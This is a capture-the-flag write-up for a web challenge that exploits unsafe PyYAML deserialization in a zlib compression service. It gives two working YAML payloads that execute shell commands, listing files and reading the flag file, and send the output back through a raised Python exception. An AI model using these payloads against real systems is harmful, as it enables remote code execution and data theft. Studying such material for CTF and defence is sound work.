# Data compressor

A pleasant little zlib web wrapper.

<hr>

Looking at the requests sent to the server, we see that when we compress, a POST request is made to `/convert_to_yaml`, and when decompressing, a POST request is made to `/convert_to_json`.

Further, when the POST ton `/convert_to_json` is successful, the returned data is under the key "zlib_yaml", indicating that the data is zlib-compressed after converting to YAML.

The vulnerability we want to exploit is then probably a call to `yaml.load()` without specifying the loader (as documented in the python docs)

Referencing HackTricks for the payload, I first tried to do a reverse shell. This didn’t work for some reason, unfortunately :(

This made most of the command-line RCE payloads useless since it was going to be hard to get the data out without a reverse shell.

However, while trying those payloads (and getting “no such file” errors for bash) I noticed that the page has a popup which prints the error message of any python exception raised. (this is also how I figured it was a python backend)

There is a python RCE payload listed on the site, so we can combine that with a `raise RuntimeError()` or similar to get our data out!

First payload (tells us what the name of the flag file is):
```yaml
!!python/object/new:str
state: !!python/tuple
- 'from subprocess import Popen; raise RuntimeError(Popen("ls",stdout=-1).communicate()[0])'
- !!python/object/new:Warning
 state:
   update: !!python/name:exec
```

[TODO photo]


Second payload (reads flag file):
```yaml
!!python/object/new:str
state: !!python/tuple
- 'from subprocess import Popen; raise RuntimeError(Popen("cat secretflag.txt",shell=1,stdout=-1).communicate()[0])'
- !!python/object/new:Warning
 state:
   update: !!python/name:exec
```

[TODO photo]

> I’m so happy right now.
 
